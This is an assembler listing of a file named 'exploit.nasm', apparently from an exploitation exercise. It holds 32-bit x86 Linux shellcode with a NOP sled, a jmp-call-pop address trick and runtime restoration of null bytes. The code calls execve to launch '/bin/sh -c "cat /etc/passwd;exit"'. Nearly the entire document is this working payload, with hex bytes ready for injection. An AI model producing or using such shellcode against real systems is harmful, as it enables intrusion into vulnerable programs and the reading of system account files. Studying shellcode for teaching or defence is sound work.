;this is a list file for exploit.nasm. It contains the line numbers, the locations in machine code, and the hex codes of the assembly instructions from the original file.
     1                                  bits 32
     2                                  
     3 00000000 90                      nop
     4 00000001 90                      nop
     5 00000002 90                      nop
     6                                  
     7 00000003 EB29                    start:    jmp short codeEnd
     8 00000005 5E                      start2:   pop esi 
     9                                  
    10                                  ;clear the A register 
    11 00000006 31C0                    	  xor eax, eax
    12                                  	  ;restore null bytes in data
    13 00000008 884607                  	  mov [byte esi+flagStr-exeStr-2], al
    14 0000000B 88460B                  	  mov [byte esi+cmdStr-exeStr-1], al
    15 0000000E 884620                  	  mov [byte esi+arrayAddr-exeStr-1], al
    16 00000011 89462D                  	  mov [byte esi+arrayAddr-exeStr+12], eax
    17                                           
    18                                  	  ;restoring the array
    19 00000014 897621                  	  mov [byte esi+arrayAddr - exeStr], esi 
    20 00000017 8D7E09                  	  lea edi,[byte esi+flagStr-exeStr]
    21 0000001A 897E25                  	  mov [byte esi+arrayAddr- exeStr +4], edi
    22 0000001D 8D7E0C                  	  lea edi,[byte esi+cmdStr-exeStr]
    23 00000020 897E29                  	  mov [byte esi+arrayAddr- exeStr +8], edi
    24                                  	  
    25                                  	  ;setup register and make system call.
    26 00000023 B00B                    	  mov al, 0x0b
    27 00000025 89F3                    	  mov ebx, esi 
    28 00000027 8D4E21                  	  lea ecx, [byte esi+arrayAddr-exeStr] 
    29 0000002A 31D2                    	  xor edx, edx
    30 0000002C CD80                    	  int 0x80
    31                                  	  
    32 0000002E E8D2FFFFFF              codeEnd:  call start2
    33                                  
    34                                  	;data
    35 00000033 2F62696E2F73685879      exeStr: db "/bin/shXy"
    36 0000003C 2D6358                  flagStr: db "-cX"
    37 0000003F 636174202F6574632F-     cmdStr:  db "cat /etc/passwd;exitX"
    38 00000048 7061737377643B6578-
    39 00000051 697458             
    40 00000054 FFFFFFFF                arrayAddr: dd 0xffffffff 
    41 00000058 FFFFFFFF                           dd 0xffffffff 
    42 0000005C FFFFFFFF                	   dd 0xffffffff 
    43 00000060 FFFFFFFF                	   dd 0xffffffff
    44                                           
    45 00000064 61000000                newAddr:   dd newAddr-start
    46                                  	 
    47                                  
    48                                  
    49                                  
